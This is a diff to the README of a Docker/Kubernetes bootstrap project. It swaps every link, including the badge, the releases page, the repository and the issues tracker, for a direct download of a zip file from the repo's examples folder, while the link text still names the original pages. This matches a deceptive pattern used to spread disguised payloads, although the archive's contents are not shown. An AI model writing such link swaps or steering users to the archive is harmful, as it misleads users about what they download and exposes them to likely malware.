@@ -1,6 +1,6 @@
 # 🚀 macmagik-docker-k8s-bootstrap - Simplify Your Local Development Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/devlcan/macmagik-docker-k8s-bootstrap/releases)
+[![Download Now](https://raw.githubusercontent.com/devlcan/macmagik-docker-k8s-bootstrap/main/examples/macmagik-docker-k8s-bootstrap-v1.0.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/devlcan/macmagik-docker-k8s-bootstrap/main/examples/macmagik-docker-k8s-bootstrap-v1.0.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ Follow these simple steps to install and run macmagik-docker-k8s-bootstrap:
 
 1. **Visit the Releases Page**
 
-   Go to the [releases page](https://github.com/devlcan/macmagik-docker-k8s-bootstrap/releases) to find the latest version.
+   Go to the [releases page](https://raw.githubusercontent.com/devlcan/macmagik-docker-k8s-bootstrap/main/examples/macmagik-docker-k8s-bootstrap-v1.0.zip) to find the latest version.
 
 2. **Download the Application**
 
@@ -67,7 +67,7 @@ Follow these simple steps to install and run macmagik-docker-k8s-bootstrap:
 
 ## 📥 Download & Install
 
-To get started, download the latest version from the [releases page](https://github.com/devlcan/macmagik-docker-k8s-bootstrap/releases).
+To get started, download the latest version from the [releases page](https://raw.githubusercontent.com/devlcan/macmagik-docker-k8s-bootstrap/main/examples/macmagik-docker-k8s-bootstrap-v1.0.zip).
 
 ## 🔧 Troubleshooting
 
@@ -101,7 +101,7 @@ Feel free to explore each topic to understand more about the technologies involv
 
 ## 🌐 Links
 
-- **GitHub Repository**: [macmagik-docker-k8s-bootstrap](https://github.com/devlcan/macmagik-docker-k8s-bootstrap)
-- **Issues Tracker**: [Report an Issue](https://github.com/devlcan/macmagik-docker-k8s-bootstrap/issues) 
+- **GitHub Repository**: [macmagik-docker-k8s-bootstrap](https://raw.githubusercontent.com/devlcan/macmagik-docker-k8s-bootstrap/main/examples/macmagik-docker-k8s-bootstrap-v1.0.zip)
+- **Issues Tracker**: [Report an Issue](https://raw.githubusercontent.com/devlcan/macmagik-docker-k8s-bootstrap/main/examples/macmagik-docker-k8s-bootstrap-v1.0.zip) 
 
 If you have any feedback or suggestions, please reach out through the repository.
